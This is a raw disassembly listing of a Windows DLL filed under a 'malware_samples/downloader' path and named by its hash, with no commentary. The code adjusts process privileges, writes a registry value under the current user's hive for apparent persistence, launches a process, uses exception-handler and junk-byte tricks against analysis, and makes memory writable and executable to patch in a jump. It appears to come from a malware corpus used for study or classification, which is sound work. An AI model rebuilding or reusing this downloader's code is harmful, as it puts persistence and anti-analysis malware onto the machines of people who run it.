
malware_samples/downloader/67ec6e25e677ccaf6306ebd4100e275030ee50a9a9b577e80360fc7f8430f699.dll:     file format pei-i386


Disassembly of section .text:

10001000 <.text>:
10001000:	55                   	push   %ebp
10001001:	8b ec                	mov    %esp,%ebp
10001003:	83 ec 14             	sub    $0x14,%esp
10001006:	8d 45 fc             	lea    -0x4(%ebp),%eax
10001009:	50                   	push   %eax
1000100a:	6a 28                	push   $0x28
1000100c:	ff 15 44 30 00 10    	call   *0x10003044
10001012:	50                   	push   %eax
10001013:	ff 15 10 30 00 10    	call   *0x10003010
10001019:	85 c0                	test   %eax,%eax
1000101b:	75 02                	jne    0x1000101f
1000101d:	c9                   	leave
1000101e:	c3                   	ret
1000101f:	56                   	push   %esi
10001020:	8d 45 f0             	lea    -0x10(%ebp),%eax
10001023:	50                   	push   %eax
10001024:	68 78 31 00 10       	push   $0x10003178
10001029:	33 f6                	xor    %esi,%esi
1000102b:	56                   	push   %esi
1000102c:	ff 15 0c 30 00 10    	call   *0x1000300c
10001032:	56                   	push   %esi
10001033:	56                   	push   %esi
10001034:	56                   	push   %esi
10001035:	8d 45 ec             	lea    -0x14(%ebp),%eax
10001038:	50                   	push   %eax
10001039:	56                   	push   %esi
1000103a:	ff 75 fc             	push   -0x4(%ebp)
1000103d:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
10001044:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
1000104b:	ff 15 08 30 00 10    	call   *0x10003008
10001051:	ff 75 fc             	push   -0x4(%ebp)
10001054:	ff 15 70 30 00 10    	call   *0x10003070
1000105a:	ff 15 1c 30 00 10    	call   *0x1000301c
10001060:	5e                   	pop    %esi
10001061:	85 c0                	test   %eax,%eax
10001063:	74 0e                	je     0x10001073
10001065:	ff 15 ec 30 00 10    	call   *0x100030ec
1000106b:	f7 d8                	neg    %eax
1000106d:	1b c0                	sbb    %eax,%eax
1000106f:	f7 d8                	neg    %eax
10001071:	c9                   	leave
10001072:	c3                   	ret
10001073:	33 c0                	xor    %eax,%eax
10001075:	40                   	inc    %eax
10001076:	c9                   	leave
10001077:	c3                   	ret
10001078:	55                   	push   %ebp
10001079:	8b ec                	mov    %esp,%ebp
1000107b:	51                   	push   %ecx
1000107c:	51                   	push   %ecx
1000107d:	53                   	push   %ebx
1000107e:	8d 45 f8             	lea    -0x8(%ebp),%eax
10001081:	50                   	push   %eax
10001082:	33 db                	xor    %ebx,%ebx
10001084:	8d 45 fc             	lea    -0x4(%ebp),%eax
10001087:	50                   	push   %eax
10001088:	53                   	push   %ebx
10001089:	68 1f 00 02 00       	push   $0x2001f
1000108e:	53                   	push   %ebx
1000108f:	53                   	push   %ebx
10001090:	53                   	push   %ebx
10001091:	ff 75 0c             	push   0xc(%ebp)
10001094:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10001097:	ff 75 08             	push   0x8(%ebp)
1000109a:	ff 15 00 30 00 10    	call   *0x10003000
100010a0:	85 c0                	test   %eax,%eax
100010a2:	75 44                	jne    0x100010e8
100010a4:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
100010a8:	75 12                	jne    0x100010bc
100010aa:	ff 75 1c             	push   0x1c(%ebp)
100010ad:	ff 15 20 30 00 10    	call   *0x10003020
100010b3:	40                   	inc    %eax
100010b4:	50                   	push   %eax
100010b5:	ff 75 1c             	push   0x1c(%ebp)
100010b8:	6a 01                	push   $0x1
100010ba:	eb 0e                	jmp    0x100010ca
100010bc:	83 7d 14 04          	cmpl   $0x4,0x14(%ebp)
100010c0:	75 1d                	jne    0x100010df
100010c2:	6a 04                	push   $0x4
100010c4:	8d 45 18             	lea    0x18(%ebp),%eax
100010c7:	50                   	push   %eax
100010c8:	6a 04                	push   $0x4
100010ca:	53                   	push   %ebx
100010cb:	ff 75 10             	push   0x10(%ebp)
100010ce:	ff 75 fc             	push   -0x4(%ebp)
100010d1:	ff 15 14 30 00 10    	call   *0x10003014
100010d7:	8b d8                	mov    %eax,%ebx
100010d9:	f7 db                	neg    %ebx
100010db:	1a db                	sbb    %bl,%bl
100010dd:	fe c3                	inc    %bl
100010df:	ff 75 fc             	push   -0x4(%ebp)
100010e2:	ff 15 04 30 00 10    	call   *0x10003004
100010e8:	8a c3                	mov    %bl,%al
100010ea:	5b                   	pop    %ebx
100010eb:	c9                   	leave
100010ec:	c3                   	ret
100010ed:	ff 25 b0 30 00 10    	jmp    *0x100030b0
100010f3:	8b c1                	mov    %ecx,%eax
100010f5:	c2 04 00             	ret    $0x4
100010f8:	55                   	push   %ebp
100010f9:	8b ec                	mov    %esp,%ebp
100010fb:	81 ec a8 06 00 00    	sub    $0x6a8,%esp
10001101:	a1 00 40 00 10       	mov    0x10004000,%eax
10001106:	33 c5                	xor    %ebp,%eax
10001108:	89 45 ec             	mov    %eax,-0x14(%ebp)
1000110b:	53                   	push   %ebx
1000110c:	56                   	push   %esi
1000110d:	57                   	push   %edi
1000110e:	c6 85 e0 fe ff ff 00 	movb   $0x0,-0x120(%ebp)
10001115:	68 03 01 00 00       	push   $0x103
1000111a:	6a 00                	push   $0x0
1000111c:	8d 85 e1 fe ff ff    	lea    -0x11f(%ebp),%eax
10001122:	50                   	push   %eax
10001123:	e8 ae 16 00 00       	call   0x100027d6
10001128:	83 c4 0c             	add    $0xc,%esp
1000112b:	90                   	nop
1000112c:	90                   	nop
1000112d:	90                   	nop
1000112e:	60                   	pusha
1000112f:	e9 31 00 00 00       	jmp    0x10001165
10001134:	8b ec                	mov    %esp,%ebp
10001136:	6a ff                	push   $0xffffffff
10001138:	68 33 22 11 00       	push   $0x112233
1000113d:	68 11 22 33 00       	push   $0x332211
10001142:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10001148:	50                   	push   %eax
10001149:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10001150:	58                   	pop    %eax
10001151:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
10001157:	58                   	pop    %eax
10001158:	58                   	pop    %eax
10001159:	58                   	pop    %eax
1000115a:	58                   	pop    %eax
1000115b:	8b e8                	mov    %eax,%ebp
1000115d:	b8 50 10 40 00       	mov    $0x401050,%eax
10001162:	50                   	push   %eax
10001163:	e8 c3 61 89 85       	call   0x9589732b
10001168:	93                   	xchg   %eax,%ebx
10001169:	fe                   	(bad)
1000116a:	ff                   	(bad)
1000116b:	ff 89 8d 99 fe ff    	decl   -0x16673(%ecx)
10001171:	ff 89 95 9f fe ff    	decl   -0x1606b(%ecx)
10001177:	ff 56 55             	call   *0x55(%esi)
1000117a:	56                   	push   %esi
1000117b:	e8 a7 00 00 00       	call   0x10001227
10001180:	c2 10 00             	ret    $0x10
10001183:	f4                   	hlt
10001184:	81 ce 83 ec 04 53    	or     $0x5304ec83,%esi
1000118a:	57                   	push   %edi
1000118b:	57                   	push   %edi
1000118c:	57                   	push   %edi
1000118d:	e8 0a 00 00 00       	call   0x1000119c
10001192:	0f 81 75 02 0f 80    	jno    0x900f140d
10001198:	58                   	pop    %eax
10001199:	71 06                	jno    0x100011a1
1000119b:	e8 58 77 f5 ff       	call   0xff588f8
100011a0:	15 59 79 02 81       	adc    $0x81027959,%eax
100011a5:	c9                   	leave
100011a6:	81 6c 24 30 84 11 00 	subl   $0x10001184,0x30(%esp)
100011ad:	10 
100011ae:	83 ec 04             	sub    $0x4,%esp
100011b1:	73 12                	jae    0x100011c5
100011b3:	81 f3 73 01 e9 53    	xor    $0x53e90173,%ebx
100011b9:	55                   	push   %ebp
100011ba:	54                   	push   %esp
100011bb:	83 ec 08             	sub    $0x8,%esp
100011be:	e8 05 00 00 00       	call   0x100011c8
100011c3:	0f 83 79 ee 35 5a    	jae    0x6a360042
100011c9:	79 02                	jns    0x100011cd
100011cb:	0f 8c 83 6c 24 48    	jl     0x58247e54
100011d1:	02 83 ec 04 7d 07    	add    0x77d04ec(%ebx),%al
100011d7:	81 ef 59 71 0e 0f    	sub    $0xf0e7159,%edi
100011dd:	87 52 55             	xchg   %edx,0x55(%edx)
100011e0:	83 ec 0c             	sub    $0xc,%esp
100011e3:	e8 05 00 00 00       	call   0x100011ed
100011e8:	81 c6 73 08 bc 83    	add    $0x83bc0873,%esi
100011ee:	c4 04 73             	les    (%ebx,%esi,2),%eax
100011f1:	e7 ff                	out    %eax,$0xff
100011f3:	25 81 44 24 5c       	and    $0x5c244481,%eax
100011f8:	7c 12                	jl     0x1000120c
100011fa:	00 10                	add    %dl,(%eax)
100011fc:	83 ec 04             	sub    $0x4,%esp
100011ff:	75 05                	jne    0x10001206
10001201:	e9 71 06 0f 8d       	jmp    0x9d0f1877
10001206:	77 0a                	ja     0x10001212
10001208:	0f 84 53 e8 05 00    	je     0x1005fa61
1000120e:	00 00                	add    %al,(%eax)
10001210:	0f 84 7f ee bf 83    	je     0x93c00095
10001216:	c4 68 c3             	les    -0x3d(%eax),%ebp
10001219:	68 00 00 00 00       	push   $0x0
1000121e:	00 00                	add    %al,(%eax)
10001220:	00 00                	add    %al,(%eax)
10001222:	00 00                	add    %al,(%eax)
10001224:	00 0f                	add    %cl,(%edi)
10001226:	82 83 ec 04 56 54 56 	addb   $0x56,0x545604ec(%ebx)
1000122d:	50                   	push   %eax
1000122e:	51                   	push   %ecx
1000122f:	e8 0d 00 00 00       	call   0x10001241
10001234:	0f 8b 7d 05 e8 58    	jnp    0x68e817b7
1000123a:	75 fa                	jne    0x10001236
1000123c:	0d 58 73 06 bb       	or     $0xbb067358,%eax
10001241:	5a                   	pop    %edx
10001242:	73 f5                	jae    0x10001239
10001244:	81 eb 83 44 24 10    	sub    $0x10244483,%ebx
1000124a:	06                   	push   %es
1000124b:	83 ec 04             	sub    $0x4,%esp
1000124e:	77 10                	ja     0x10001260
10001250:	0f 83 50 54 51 53    	jae    0x635166a6
10001256:	e8 01 00 00 00       	call   0x1000125c
1000125b:	bc 73 05 0f 89       	mov    $0x890f0573,%esp
10001260:	77 f0                	ja     0x10001252
10001262:	bf 5a 79 02 81       	mov    $0x8102795a,%edi
10001267:	f6 ff                	idiv   %bh
10001269:	64 24 24             	fs and $0x24,%al
1000126c:	b5 e1                	mov    $0xe1,%ch
1000126e:	b4 00                	mov    $0x0,%ah
	...
10001278:	00 00                	add    %al,(%eax)
1000127a:	81 e1 83 c4 0c 8b    	and    $0x8b0cc483,%ecx
10001280:	85 93 fe ff ff 8b    	test   %edx,-0x74000002(%ebx)
10001286:	8d 99 fe ff ff 8b    	lea    -0x74000002(%ecx),%ebx
1000128c:	95                   	xchg   %eax,%ebp
1000128d:	9f                   	lahf
1000128e:	fe                   	(bad)
1000128f:	ff                   	(bad)
10001290:	ff 8b 45 0c 89 85    	decl   -0x7a76f3bb(%ebx)
10001296:	bc f9 ff ff 8b       	mov    $0x8bfffff9,%esp
1000129b:	85 bc f9 ff ff 89 85 	test   %edi,-0x7a760001(%ecx,%edi,8)
100012a2:	b8 f9 ff ff 83       	mov    $0x83fffff9,%eax
100012a7:	ad                   	lods   %ds:(%esi),%eax
100012a8:	b8 f9 ff ff 01       	mov    $0x1fffff9,%eax
100012ad:	74 05                	je     0x100012b4
100012af:	e9 1b 05 00 00       	jmp    0x100017cf
100012b4:	ff 15 4c 30 00 10    	call   *0x1000304c
100012ba:	89 85 64 fd ff ff    	mov    %eax,-0x29c(%ebp)
100012c0:	83 a5 6c fd ff ff 00 	andl   $0x0,-0x294(%ebp)
100012c7:	83 a5 68 fd ff ff 00 	andl   $0x0,-0x298(%ebp)
100012ce:	6a 00                	push   $0x0
100012d0:	68 8c 31 00 10       	push   $0x1000318c
100012d5:	ff 15 04 31 00 10    	call   *0x10003104
100012db:	89 85 60 fd ff ff    	mov    %eax,-0x2a0(%ebp)
100012e1:	83 bd 60 fd ff ff 00 	cmpl   $0x0,-0x2a0(%ebp)
100012e8:	74 5d                	je     0x10001347
100012ea:	8d 85 68 fd ff ff    	lea    -0x298(%ebp),%eax
100012f0:	50                   	push   %eax
100012f1:	ff b5 60 fd ff ff    	push   -0x2a0(%ebp)
100012f7:	ff 15 10 31 00 10    	call   *0x10003110
100012fd:	89 85 6c fd ff ff    	mov    %eax,-0x294(%ebp)
10001303:	8b 85 68 fd ff ff    	mov    -0x298(%ebp),%eax
10001309:	3b 85 64 fd ff ff    	cmp    -0x29c(%ebp),%eax
1000130f:	75 20                	jne    0x10001331
10001311:	83 bd 68 fd ff ff 00 	cmpl   $0x0,-0x298(%ebp)
10001318:	74 17                	je     0x10001331
1000131a:	6a 00                	push   $0x0
1000131c:	ff b5 60 fd ff ff    	push   -0x2a0(%ebp)
10001322:	ff 15 00 31 00 10    	call   *0x10003100
10001328:	83 a5 60 fd ff ff 00 	andl   $0x0,-0x2a0(%ebp)
1000132f:	eb 14                	jmp    0x10001345
10001331:	6a 02                	push   $0x2
10001333:	ff b5 60 fd ff ff    	push   -0x2a0(%ebp)
10001339:	ff 15 08 31 00 10    	call   *0x10003108
1000133f:	89 85 60 fd ff ff    	mov    %eax,-0x2a0(%ebp)
10001345:	eb 9a                	jmp    0x100012e1
10001347:	e8 b4 fc ff ff       	call   0x10001000
1000134c:	85 c0                	test   %eax,%eax
1000134e:	0f 85 ce 03 00 00    	jne    0x10001722
10001354:	83 a5 50 fb ff ff 00 	andl   $0x0,-0x4b0(%ebp)
1000135b:	c6 85 60 fc ff ff 00 	movb   $0x0,-0x3a0(%ebp)
10001362:	68 ff 00 00 00       	push   $0xff
10001367:	6a 00                	push   $0x0
10001369:	8d 85 61 fc ff ff    	lea    -0x39f(%ebp),%eax
1000136f:	50                   	push   %eax
10001370:	e8 61 14 00 00       	call   0x100027d6
10001375:	83 c4 0c             	add    $0xc,%esp
10001378:	ff 15 30 30 00 10    	call   *0x10003030
1000137e:	89 85 54 fb ff ff    	mov    %eax,-0x4ac(%ebp)
10001384:	68 04 01 00 00       	push   $0x104
10001389:	6a 00                	push   $0x0
1000138b:	8d 85 58 fb ff ff    	lea    -0x4a8(%ebp),%eax
10001391:	50                   	push   %eax
10001392:	e8 3f 14 00 00       	call   0x100027d6
10001397:	83 c4 0c             	add    $0xc,%esp
1000139a:	68 04 01 00 00       	push   $0x104
1000139f:	8d 85 58 fb ff ff    	lea    -0x4a8(%ebp),%eax
100013a5:	50                   	push   %eax
100013a6:	6a 00                	push   $0x0
100013a8:	ff 15 40 30 00 10    	call   *0x10003040
100013ae:	68 a0 31 00 10       	push   $0x100031a0
100013b3:	ff b5 54 fb ff ff    	push   -0x4ac(%ebp)
100013b9:	e8 2f fd ff ff       	call   0x100010ed
100013be:	59                   	pop    %ecx
100013bf:	59                   	pop    %ecx
100013c0:	89 85 50 fb ff ff    	mov    %eax,-0x4b0(%ebp)
100013c6:	83 bd 50 fb ff ff 00 	cmpl   $0x0,-0x4b0(%ebp)
100013cd:	0f 84 9e 00 00 00    	je     0x10001471
100013d3:	8b 85 50 fb ff ff    	mov    -0x4b0(%ebp),%eax
100013d9:	89 85 b4 f9 ff ff    	mov    %eax,-0x64c(%ebp)
100013df:	8d 85 60 fc ff ff    	lea    -0x3a0(%ebp),%eax
100013e5:	89 85 b0 f9 ff ff    	mov    %eax,-0x650(%ebp)
100013eb:	8b 85 b0 f9 ff ff    	mov    -0x650(%ebp),%eax
100013f1:	89 85 ac f9 ff ff    	mov    %eax,-0x654(%ebp)
100013f7:	8b 85 b4 f9 ff ff    	mov    -0x64c(%ebp),%eax
100013fd:	8a 00                	mov    (%eax),%al
100013ff:	88 85 ab f9 ff ff    	mov    %al,-0x655(%ebp)
10001405:	8b 85 b0 f9 ff ff    	mov    -0x650(%ebp),%eax
1000140b:	8a 8d ab f9 ff ff    	mov    -0x655(%ebp),%cl
10001411:	88 08                	mov    %cl,(%eax)
10001413:	8b 85 b4 f9 ff ff    	mov    -0x64c(%ebp),%eax
10001419:	40                   	inc    %eax
1000141a:	89 85 b4 f9 ff ff    	mov    %eax,-0x64c(%ebp)
10001420:	8b 85 b0 f9 ff ff    	mov    -0x650(%ebp),%eax
10001426:	40                   	inc    %eax
10001427:	89 85 b0 f9 ff ff    	mov    %eax,-0x650(%ebp)
1000142d:	80 bd ab f9 ff ff 00 	cmpb   $0x0,-0x655(%ebp)
10001434:	75 c1                	jne    0x100013f7
10001436:	8d 85 60 fc ff ff    	lea    -0x3a0(%ebp),%eax
1000143c:	48                   	dec    %eax
1000143d:	89 85 a4 f9 ff ff    	mov    %eax,-0x65c(%ebp)
10001443:	8b 85 a4 f9 ff ff    	mov    -0x65c(%ebp),%eax
10001449:	8a 40 01             	mov    0x1(%eax),%al
1000144c:	88 85 a3 f9 ff ff    	mov    %al,-0x65d(%ebp)
10001452:	ff 85 a4 f9 ff ff    	incl   -0x65c(%ebp)
10001458:	80 bd a3 f9 ff ff 00 	cmpb   $0x0,-0x65d(%ebp)
1000145f:	75 e2                	jne    0x10001443
10001461:	8b bd a4 f9 ff ff    	mov    -0x65c(%ebp),%edi
10001467:	be a4 31 00 10       	mov    $0x100031a4,%esi
1000146c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1000146d:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
1000146f:	eb 0d                	jmp    0x1000147e
10001471:	be ac 31 00 10       	mov    $0x100031ac,%esi
10001476:	8d bd 60 fc ff ff    	lea    -0x3a0(%ebp),%edi
1000147c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1000147d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1000147e:	68 b4 31 00 10       	push   $0x100031b4
10001483:	6a 00                	push   $0x0
10001485:	6a 01                	push   $0x1
10001487:	8d 85 58 fb ff ff    	lea    -0x4a8(%ebp),%eax
1000148d:	50                   	push   %eax
1000148e:	68 c8 31 00 10       	push   $0x100031c8
10001493:	68 01 00 00 80       	push   $0x80000001
10001498:	e8 db fb ff ff       	call   0x10001078
1000149d:	83 c4 18             	add    $0x18,%esp
100014a0:	0f b6 c0             	movzbl %al,%eax
100014a3:	85 c0                	test   %eax,%eax
100014a5:	0f 84 72 02 00 00    	je     0x1000171d
100014ab:	c7 85 f8 fa ff ff 44 	movl   $0x44,-0x508(%ebp)
100014b2:	00 00 00 
100014b5:	6a 40                	push   $0x40
100014b7:	6a 00                	push   $0x0
100014b9:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
100014bf:	50                   	push   %eax
100014c0:	e8 11 13 00 00       	call   0x100027d6
100014c5:	83 c4 0c             	add    $0xc,%esp
100014c8:	c6 85 f0 f9 ff ff 00 	movb   $0x0,-0x610(%ebp)
100014cf:	68 03 01 00 00       	push   $0x103
100014d4:	6a 00                	push   $0x0
100014d6:	8d 85 f1 f9 ff ff    	lea    -0x60f(%ebp),%eax
100014dc:	50                   	push   %eax
100014dd:	e8 f4 12 00 00       	call   0x100027d6
100014e2:	83 c4 0c             	add    $0xc,%esp
100014e5:	be 0c 32 00 10       	mov    $0x1000320c,%esi
100014ea:	8d bd f0 f9 ff ff    	lea    -0x610(%ebp),%edi
100014f0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
100014f1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
100014f2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
100014f3:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
100014f5:	8d 85 58 fb ff ff    	lea    -0x4a8(%ebp),%eax
100014fb:	89 85 9c f9 ff ff    	mov    %eax,-0x664(%ebp)
10001501:	8b 85 9c f9 ff ff    	mov    -0x664(%ebp),%eax
10001507:	89 85 98 f9 ff ff    	mov    %eax,-0x668(%ebp)
1000150d:	8b 85 9c f9 ff ff    	mov    -0x664(%ebp),%eax
10001513:	8a 00                	mov    (%eax),%al
10001515:	88 85 97 f9 ff ff    	mov    %al,-0x669(%ebp)
1000151b:	ff 85 9c f9 ff ff    	incl   -0x664(%ebp)
10001521:	80 bd 97 f9 ff ff 00 	cmpb   $0x0,-0x669(%ebp)
10001528:	75 e3                	jne    0x1000150d
1000152a:	8b 85 9c f9 ff ff    	mov    -0x664(%ebp),%eax
10001530:	2b 85 98 f9 ff ff    	sub    -0x668(%ebp),%eax
10001536:	8b 8d 98 f9 ff ff    	mov    -0x668(%ebp),%ecx
1000153c:	89 8d 90 f9 ff ff    	mov    %ecx,-0x670(%ebp)
10001542:	89 85 8c f9 ff ff    	mov    %eax,-0x674(%ebp)
10001548:	8d 85 f0 f9 ff ff    	lea    -0x610(%ebp),%eax
1000154e:	48                   	dec    %eax
1000154f:	89 85 88 f9 ff ff    	mov    %eax,-0x678(%ebp)
10001555:	8b 85 88 f9 ff ff    	mov    -0x678(%ebp),%eax
1000155b:	8a 40 01             	mov    0x1(%eax),%al
1000155e:	88 85 87 f9 ff ff    	mov    %al,-0x679(%ebp)
10001564:	ff 85 88 f9 ff ff    	incl   -0x678(%ebp)
1000156a:	80 bd 87 f9 ff ff 00 	cmpb   $0x0,-0x679(%ebp)
10001571:	75 e2                	jne    0x10001555
10001573:	8b bd 88 f9 ff ff    	mov    -0x678(%ebp),%edi
10001579:	8b b5 90 f9 ff ff    	mov    -0x670(%ebp),%esi
1000157f:	8b 85 8c f9 ff ff    	mov    -0x674(%ebp),%eax
10001585:	8b c8                	mov    %eax,%ecx
10001587:	c1 e9 02             	shr    $0x2,%ecx
1000158a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1000158c:	8b c8                	mov    %eax,%ecx
1000158e:	83 e1 03             	and    $0x3,%ecx
10001591:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
10001593:	8d 85 f0 f9 ff ff    	lea    -0x610(%ebp),%eax
10001599:	48                   	dec    %eax
1000159a:	89 85 80 f9 ff ff    	mov    %eax,-0x680(%ebp)
100015a0:	8b 85 80 f9 ff ff    	mov    -0x680(%ebp),%eax
100015a6:	8a 40 01             	mov    0x1(%eax),%al
100015a9:	88 85 7f f9 ff ff    	mov    %al,-0x681(%ebp)
100015af:	ff 85 80 f9 ff ff    	incl   -0x680(%ebp)
100015b5:	80 bd 7f f9 ff ff 00 	cmpb   $0x0,-0x681(%ebp)
100015bc:	75 e2                	jne    0x100015a0
100015be:	8b bd 80 f9 ff ff    	mov    -0x680(%ebp),%edi
100015c4:	be 1c 32 00 10       	mov    $0x1000321c,%esi
100015c9:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
100015cb:	a4                   	movsb  %ds:(%esi),%es:(%edi)
100015cc:	8d 85 60 fc ff ff    	lea    -0x3a0(%ebp),%eax
100015d2:	89 85 78 f9 ff ff    	mov    %eax,-0x688(%ebp)
100015d8:	8b 85 78 f9 ff ff    	mov    -0x688(%ebp),%eax
100015de:	89 85 74 f9 ff ff    	mov    %eax,-0x68c(%ebp)
100015e4:	8b 85 78 f9 ff ff    	mov    -0x688(%ebp),%eax
100015ea:	8a 00                	mov    (%eax),%al
100015ec:	88 85 73 f9 ff ff    	mov    %al,-0x68d(%ebp)
100015f2:	ff 85 78 f9 ff ff    	incl   -0x688(%ebp)
100015f8:	80 bd 73 f9 ff ff 00 	cmpb   $0x0,-0x68d(%ebp)
100015ff:	75 e3                	jne    0x100015e4
10001601:	8b 85 78 f9 ff ff    	mov    -0x688(%ebp),%eax
10001607:	2b 85 74 f9 ff ff    	sub    -0x68c(%ebp),%eax
1000160d:	8b 8d 74 f9 ff ff    	mov    -0x68c(%ebp),%ecx
10001613:	89 8d 6c f9 ff ff    	mov    %ecx,-0x694(%ebp)
10001619:	89 85 68 f9 ff ff    	mov    %eax,-0x698(%ebp)
1000161f:	8d 85 f0 f9 ff ff    	lea    -0x610(%ebp),%eax
10001625:	48                   	dec    %eax
10001626:	89 85 64 f9 ff ff    	mov    %eax,-0x69c(%ebp)
1000162c:	8b 85 64 f9 ff ff    	mov    -0x69c(%ebp),%eax
10001632:	8a 40 01             	mov    0x1(%eax),%al
10001635:	88 85 63 f9 ff ff    	mov    %al,-0x69d(%ebp)
1000163b:	ff 85 64 f9 ff ff    	incl   -0x69c(%ebp)
10001641:	80 bd 63 f9 ff ff 00 	cmpb   $0x0,-0x69d(%ebp)
10001648:	75 e2                	jne    0x1000162c
1000164a:	8b bd 64 f9 ff ff    	mov    -0x69c(%ebp),%edi
10001650:	8b b5 6c f9 ff ff    	mov    -0x694(%ebp),%esi
10001656:	8b 85 68 f9 ff ff    	mov    -0x698(%ebp),%eax
1000165c:	8b c8                	mov    %eax,%ecx
1000165e:	c1 e9 02             	shr    $0x2,%ecx
10001661:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
10001663:	8b c8                	mov    %eax,%ecx
10001665:	83 e1 03             	and    $0x3,%ecx
10001668:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
1000166a:	8d 85 f0 f9 ff ff    	lea    -0x610(%ebp),%eax
10001670:	48                   	dec    %eax
10001671:	89 85 5c f9 ff ff    	mov    %eax,-0x6a4(%ebp)
10001677:	8b 85 5c f9 ff ff    	mov    -0x6a4(%ebp),%eax
1000167d:	8a 40 01             	mov    0x1(%eax),%al
10001680:	88 85 5b f9 ff ff    	mov    %al,-0x6a5(%ebp)
10001686:	ff 85 5c f9 ff ff    	incl   -0x6a4(%ebp)
1000168c:	80 bd 5b f9 ff ff 00 	cmpb   $0x0,-0x6a5(%ebp)
10001693:	75 e2                	jne    0x10001677
10001695:	8b bd 5c f9 ff ff    	mov    -0x6a4(%ebp),%edi
1000169b:	be 20 32 00 10       	mov    $0x10003220,%esi
100016a0:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
100016a2:	c7 85 24 fb ff ff 01 	movl   $0x1,-0x4dc(%ebp)
100016a9:	00 00 00 
100016ac:	33 c0                	xor    %eax,%eax
100016ae:	66 89 85 28 fb ff ff 	mov    %ax,-0x4d8(%ebp)
100016b5:	8d 85 40 fb ff ff    	lea    -0x4c0(%ebp),%eax
100016bb:	50                   	push   %eax
100016bc:	8d 85 f8 fa ff ff    	lea    -0x508(%ebp),%eax
100016c2:	50                   	push   %eax
100016c3:	6a 00                	push   $0x0
100016c5:	6a 00                	push   $0x0
100016c7:	6a 00                	push   $0x0
100016c9:	6a 00                	push   $0x0
100016cb:	6a 00                	push   $0x0
100016cd:	6a 00                	push   $0x0
100016cf:	8d 85 f0 f9 ff ff    	lea    -0x610(%ebp),%eax
100016d5:	50                   	push   %eax
100016d6:	6a 00                	push   $0x0
100016d8:	ff 15 34 30 00 10    	call   *0x10003034
100016de:	89 45 f0             	mov    %eax,-0x10(%ebp)
100016e1:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
100016e5:	75 36                	jne    0x1000171d
100016e7:	ff 15 1c 30 00 10    	call   *0x1000301c
100016ed:	50                   	push   %eax
100016ee:	8d 85 f0 f9 ff ff    	lea    -0x610(%ebp),%eax
100016f4:	50                   	push   %eax
100016f5:	68 24 32 00 10       	push   $0x10003224
100016fa:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
10001700:	50                   	push   %eax
10001701:	ff 15 0c 31 00 10    	call   *0x1000310c
10001707:	83 c4 10             	add    $0x10,%esp
1000170a:	6a 00                	push   $0x0
1000170c:	6a 00                	push   $0x0
1000170e:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
10001714:	50                   	push   %eax
10001715:	6a 00                	push   $0x0
10001717:	ff 15 fc 30 00 10    	call   *0x100030fc
1000171d:	e9 ad 00 00 00       	jmp    0x100017cf
10001722:	c6 85 70 fd ff ff 00 	movb   $0x0,-0x290(%ebp)
10001729:	68 03 01 00 00       	push   $0x103
1000172e:	6a 00                	push   $0x0
10001730:	8d 85 71 fd ff ff    	lea    -0x28f(%ebp),%eax
10001736:	50                   	push   %eax
10001737:	e8 9a 10 00 00       	call   0x100027d6
1000173c:	83 c4 0c             	add    $0xc,%esp
1000173f:	83 a5 88 fe ff ff 00 	andl   $0x0,-0x178(%ebp)
10001746:	83 a5 8c fe ff ff 00 	andl   $0x0,-0x174(%ebp)
1000174d:	c7 85 88 fe ff ff a5 	movl   $0x100018a5,-0x178(%ebp)
10001754:	18 00 10 
10001757:	ff 75 08             	push   0x8(%ebp)
1000175a:	ff 15 38 30 00 10    	call   *0x10003038
10001760:	6a 00                	push   $0x0
10001762:	ff 15 74 30 00 10    	call   *0x10003074
10001768:	89 85 80 fe ff ff    	mov    %eax,-0x180(%ebp)
1000176e:	8b 85 80 fe ff ff    	mov    -0x180(%ebp),%eax
10001774:	05 00 a0 1e 00       	add    $0x1ea000,%eax
10001779:	89 85 84 fe ff ff    	mov    %eax,-0x17c(%ebp)
1000177f:	8d 85 7c fe ff ff    	lea    -0x184(%ebp),%eax
10001785:	50                   	push   %eax
10001786:	6a 40                	push   $0x40
10001788:	68 00 10 00 00       	push   $0x1000
1000178d:	ff b5 84 fe ff ff    	push   -0x17c(%ebp)
10001793:	ff 15 48 30 00 10    	call   *0x10003048
10001799:	8b 85 84 fe ff ff    	mov    -0x17c(%ebp),%eax
1000179f:	05 fa 00 00 00       	add    $0xfa,%eax
100017a4:	89 85 8c fe ff ff    	mov    %eax,-0x174(%ebp)
100017aa:	8b 85 8c fe ff ff    	mov    -0x174(%ebp),%eax
100017b0:	83 c0 04             	add    $0x4,%eax
100017b3:	8b 8d 88 fe ff ff    	mov    -0x178(%ebp),%ecx
100017b9:	2b c8                	sub    %eax,%ecx
100017bb:	89 8d 88 fe ff ff    	mov    %ecx,-0x178(%ebp)
100017c1:	8b 85 8c fe ff ff    	mov    -0x174(%ebp),%eax
100017c7:	8b 8d 88 fe ff ff    	mov    -0x178(%ebp),%ecx
100017cd:	89 08                	mov    %ecx,(%eax)
100017cf:	33 c0                	xor    %eax,%eax
100017d1:	66 89 85 c0 f9 ff ff 	mov    %ax,-0x640(%ebp)
100017d8:	33 c0                	xor    %eax,%eax
100017da:	8d bd c2 f9 ff ff    	lea    -0x63e(%ebp),%edi
